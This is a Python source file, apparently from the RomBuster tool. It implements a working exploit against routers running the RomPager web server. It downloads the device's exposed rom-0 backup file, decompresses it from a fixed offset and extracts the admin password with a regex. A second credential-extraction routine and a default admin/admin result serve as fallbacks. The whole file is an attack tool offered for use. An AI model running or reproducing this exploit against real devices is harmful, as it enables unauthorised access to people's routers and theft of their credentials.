

import http.client
import re
import requests
from pex.string import String

from .trigger import Trigger


class RomBuster(String):
    """ Main class of rombuster module.

    This main class of rombuster module is intended for providing
    an exploit for RomPager vulnerability that extracts credentials
    from the obtained rom-0 file.
    """

    def __init__(self) -> None:
        super().__init__()

    def exploit(self, address: str) -> tuple:
        """ Exploit the vulnerability in RomPager and extract credentials.

        :param str address: device address
        :return tuple: tuple of username and password
        """

        try:
            response = requests.get(
                f"http://{address}/rom-0",
                verify=False,
                timeout=3
            )

            username = 'admin'
            data = response.content[8568:]
            result = self.lzs_decompress(data)

            password = re.findall("([\040-\176]{5,})", result)
            if len(password):
                return username, password[0]

        except Exception:
            trigger = Trigger(address.split(':')[0])
            username, password = trigger.extract_credentials()

            if username is None and password is None:
                return

            if not username and not password:
                return 'admin', 'admin'

            return username, password
